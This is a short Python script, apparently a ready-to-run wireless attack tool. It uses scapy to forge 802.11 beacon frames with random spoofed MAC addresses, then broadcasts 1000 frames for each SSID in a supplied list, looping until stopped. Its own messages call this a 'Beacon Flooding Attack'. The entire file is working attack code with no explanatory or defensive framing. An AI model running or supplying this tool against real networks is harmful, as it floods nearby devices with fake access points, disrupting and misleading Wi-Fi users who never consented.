import sys
import time
import threading
from randmac import RandMac
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, hexdump

def main(iface, ssid):
    example_mac = "00:00:00:00:00:00"
    sender = RandMac(example_mac)

    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=sender, addr3=sender)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))

    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, iface=iface, count=1000)

if __name__=='__main__':
    args = sys.argv

    if(len(args) != 3):
        print("[*] How to use?\n# python3 {} [interface_name] [ssid_list_file]".format(args[0]))
        sys.exit(0)

    print("[*] Starting Beacon Flooding Attack!")

    iface = args[1]

    try:
        while True:
            with open(args[2]) as file:
                for line in file:
                    main(iface, line.strip())
            print('To stop the program, press Ctrl+C now.')
            time.sleep(2)

    except KeyboardInterrupt:
        print('Stop Beacon Flooding Attack!')
        sys.exit()
